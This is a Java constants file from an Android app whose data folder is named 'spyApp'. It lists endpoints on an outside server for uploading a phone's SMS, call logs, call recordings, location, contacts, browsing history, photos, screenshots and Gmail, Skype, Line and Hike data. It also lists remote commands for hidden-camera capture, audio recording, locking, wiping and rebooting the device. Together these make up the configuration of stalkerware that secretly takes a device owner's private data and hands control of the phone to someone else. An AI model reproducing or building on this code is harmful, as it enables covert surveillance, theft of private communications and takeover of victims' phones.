package sedco.calllog;

/**
 * Created by Ankit on 4/24/2016.
 */
public class Const {
    public static final String BASE_URL = "http://volanze.com/api/";
    public static final String WS_REGISTERDEVICE = "devices/";
    public static final String WS_REGISTERSIM = "sims/";
    public static final String WS_SMSLOG = "smslogs/";
    public static final String WS_MMSLOG = "mmslogs/";
    public static final String WS_CALLLOGS = "calllogs/";
    public static final String WS_HISTORYBOOKMARKLOGS = "historybookmarklogs/";
    public static final String WS_LOCATIONLOGS = "locationlogs/";
    public static final String WS_INSTALLAPPLOGS = "installapplogs/";
    public static final String WS_EVENTINFOLOGS = "eventinfologs/";
    public static final String WS_CONTACTLOGS = "contactlogs/";
    public static final String WS_ONETIMELOCATIONLOGS = "onetimelocationlogs/";
    public static final String WS_UPDATETOKENLOGS = "updatetoken/";
    public static final String WS_GENERALINFOLOGS = "generalinfologs/";
    public static final String WS_HIKELOGS = "hikelogs/";
    public static final String WS_SKYPELOGS = "skypelogs/";
    public static final String WS_LINELOGS = "linelogs/";
    public static final String WS_IMAGES = "imagelogs/";
    public static final String WS_VIDEOS = "videologs/";
    public static final String WS_FILES = "filelogs/";
    public static final String WS_CALLRECORDING = "callrecordinglogs/";
    public static final String WS_SCREENSHOT = "screenshotlogs/";
    public static final String WS_USER = "users/";
    public static final String WS_GMAIL = "gmaillogs/";
    public static final int DEFAULT_RECORD_SIZE = 2000;
    public static final int DEFAULT_RECORD_SIZE_EVENT = 30;

    public static final int TYPE_SENT_INT = 2;
    public static final int TYPE_RECEIVE_INT = 1;
    public static final String TYPE_SENT_STRING = "sent";
    public static final String TYPE_RECEIVE_STRING = "Receive";

    public static final String ACTIVE_FEATURE = "active_feature";
    //Bookmark & Historytype
    public static final String TYPE_CHROME = "chrome";
    public static final String TYPE_DEFAULT = "default";

    // Init date for getting all device data after particular data
    public static final String INITDATETIME = "2010-05-05 00:00:00";

    //default application folder
    public static final String APPFOLDER = "spyApp";

    // datetime format throght out application
    public static final String DATEFORMATE = "yyyy-MM-dd HH:mm:ss";

    public static final String DATEFORMATE_EVENT = "yyyy-MM-dd";


    //Camera type
    public static final int CAMERA_FRONT = 1;//const for front camera
    public static final int CAMERA_BACK = 2;//const for back camera


    //CALL RECORD
    //MIC-1 VOICE_CALL- 4  VOICE_UPLINK-2 VOICE_DOWNLINK-3
    public static final int AUDIO_SOURCE = 1;
    public static final int AUDIO_FORMAT = 2;


//    SyncData to server

    public static final String SYNCDATAINTERVAL = "syncdatainterval";
    public static final String SYNCGEERALINFOINTERVAL = "syncgeeralinfointerval";
    public static final long DAFUALTINTERAVAL_SYNCDATA_TO_SERVER_MIN = 10;
    public static final long DAFUALTINTERAVAL_GENERALINFO_TO_SERVER_MIN = 15;
    public static final long DAFUALTINTERAVAL_LAUNCHER_SERVICE = 1;
    public static final int REQUESTCODEFORALARMSERVERCALL = 10111;
    public static final int REQUESTCODEFORALARMGENERALCALL = 10112;

    //duration for recording audio
    public static final int DAFUALTDURATION_FOR_RECORD_AUDIO_MIN = 1;

    //Loction interval
    public static final int LOCATION_INTERVAL_MIN = 1;


    /**
     * This constant are used for active/inactive feature for below thing
     */
    // Message for active module
    public static final String ACTIVESMS = "activesms";
    public static final String ACTIVEMMS = "activemms";
    public static final String ACTIVECALLLOG = "activecalllog";
    public static final String ACTIVELOCATION = "activelocation";
    public static final String ACTIVEIMAGE = "activeimage";
    public static final String ACTIVEVIDEO = "activevideo";
    public static final String ACTIVEFFILE = "activefile";
    public static final String ACTIVEAPPLICATION = "activeapplication";
    public static final String ACTIVECALENDEREVENT = "activecalenderevent";
    public static final String ACTIVEBOOKMARK = "activebookmark";
    public static final String ACTIVEHISTORY = "activehistory";
    public static final String ACTIVECONTACT = "activecontact";
    public static final String ACTIVECALLRECORD = "activecallrecord";
    public static final String ACTIVEWIFIONLY = "activewifionly";

    /**
     * This blog use for Shortcode for notifaction to get data for particualr data
     */
    //SHORTCODE FoR FUNCTIONALITY
    public static final String GETSCREENSHOT = "getscreenShot";
    public static final String GETBATTERYLEVEL = "getBatterylevel";
    public static final String CALLHIDDENCAMERA = "callHiddenCamera";
    public static final String STARTRECORD = "startrecord";
    public static final String GETLOCATION = "getlocation";
    public static final String MAKE_CALL = "make_call";
    public static final String MAKE_SMS = "make_sms";
    public static final String LOCK_PHONE = "lock_phone";
    public static final String UNLOCK_PHONE = "unlock_phone";
    public static final String WIPE_OUT = "wipe_out";
    public static final String REBOOT = "reboot";
    public static final String SHUTDOWN = "shutdown";
    public static final String ENABLE_GPS = "enable_gps";
    public static final String GETSIMINFORMATION = "getsiminformation";
    public static final String ENABLE_WIFI = "enable_wifi";
    public static final String DISABLE_WIFI = "disable_wifi";
    public static final String GET_GMAILDATA = "getgmaildata";
    public static final String GET_SKYPEDATA = "get_skypedata";
    public static final String GET_FACEBOOKDATA = "get_facebookdata";
    public static final String GET_HIKEDATA = "get_hikedata";
    public static final String GET_KIKDATA = "get_kikdata";
    public static final String GET_LINEDATA = "get_linedata";

}
